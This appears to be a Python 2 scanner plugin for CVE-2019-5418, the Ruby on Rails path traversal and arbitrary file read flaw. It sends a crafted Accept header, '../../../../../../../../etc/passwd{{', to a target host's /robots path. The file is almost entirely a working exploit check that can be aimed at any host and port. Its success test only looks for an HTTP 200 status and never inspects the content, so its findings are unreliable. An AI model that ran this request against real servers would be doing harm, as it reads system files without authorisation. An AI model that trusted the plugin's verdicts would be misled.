# coding:utf-8
import requests

headers = {
    'Accept-Encoding': 'gzip, deflate',
    'Accept': '../../../../../../../../etc/passwd{{',
    'Accept-Language': 'en',
    'User-Agent': 'Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)',
    'Connection': 'close'
}

def get_plugin_info():
    plugin_info = {
        "name": "Ruby on Rails 路径穿越与任意文件读取漏洞",
        "info": "在控制器中通过render file形式来渲染应用之外的视图，且会根据用户传入的Accept头来确定文件具体位置。我们通过传入Accept: ../../../../../../../../etc/passwd{{头来构成构造路径穿越漏洞，读取任意文件",
        "level": "高危",
        "type": "LFR",
        "author": "taro",
        "url": "https://github.com/vulhub/vulhub/tree/master/rails/CVE-2019-5418",
        "keyword": "all:rails",
    }
    return plugin_info

def check(host, port, timeout):
    url = "http://%s:%d/robots" % (host, int(port))
    try:
        res = requests.get(url=url, headers=headers , timeout=timeout)
        if res.status_code == 200 :
            info = 'Ruby on Rails 路径穿越与任意文件: %s' % url
            return info
    except Exception, e:
        pass
